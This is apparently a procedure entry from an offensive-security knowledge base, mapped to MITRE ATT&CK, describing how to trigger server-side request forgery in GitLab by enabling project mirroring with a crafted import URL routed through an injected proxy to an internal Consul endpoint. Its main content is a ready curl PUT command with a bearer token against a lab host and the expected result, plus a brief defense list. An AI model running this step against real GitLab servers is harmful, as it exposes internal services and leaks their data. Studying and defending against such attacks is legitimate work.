---
id: proc-uuid-005
tags:
  - ssrf
  - mirror
  - gitlab-api
type: procedure
tools:
  - '[[tools/proxy-py]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-add-mirror-trigger]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:53:38.541Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Add-Mirror-to-Trigger-SSRF

## Summary

This procedure enables mirroring on the injected project with a URL that triggers git clone through the proxy, causing SSRF to the internal Consul endpoint.

## Description

PUT to /api/v4/projects/<id> with mirror=true and import_url=http://google.com/v1/config? forces a clone attempt. The injected proxy routes to localhost:8500/v1/config, hitting the simulated service and leaking responses in errors.

## Requirements

1. Project ID from creation (e.g., 204)
2. GitLab API token
3. DNS redirected and proxy running

## Defense

Defensive measures and detection strategies:

- Disable or restrict mirroring for untrusted imports
- Proxy git commands to block internal resolutions
- Monitor gitaly logs for anomalous clone URLs

## Objectives

1. Enable mirror to initiate clone
2. Route through injected proxy for SSRF
3. Capture request on local proxy

## Instructions

### Step 1: Update Project for Mirroring

**Context**: Use API to set mirror=true and provide SSRF URL, appending ? to strip paths.

**Command** ([[commands/curl-add-mirror-trigger]]):
```bash
curl -H "Authorization: Bearer $TOKEN" -v -XPUT 'http://gitlab-vm.local/api/v4/projects/204?mirror=true&import_url=http://google.com/v1/config?'
```

> Expected output: 200 OK, mirror enabled; check proxy.py logs for incoming GET /v1/config.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-add-mirror-trigger]]

## Tools Used

- [[tools/proxy-py]]

## Tags

- ssrf
- mirror
